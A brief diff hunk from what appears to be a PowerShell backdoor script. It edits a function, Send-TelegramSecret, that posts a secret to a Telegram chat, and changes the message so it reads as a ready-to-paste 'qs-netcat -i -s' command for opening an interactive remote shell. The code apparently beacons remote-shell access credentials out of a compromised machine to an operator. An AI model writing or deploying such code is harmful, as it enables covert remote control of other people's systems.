@@ -21,7 +21,7 @@ function Send-TelegramSecret {
         -Method Post `
         -Body @{
             chat_id = $CHAT_ID
-            text    = "QS SECRET: $Secret"
+            text    = "QS SECRET: qs-netcat -i -s $Secret"
         } | Out-Null
 }
 
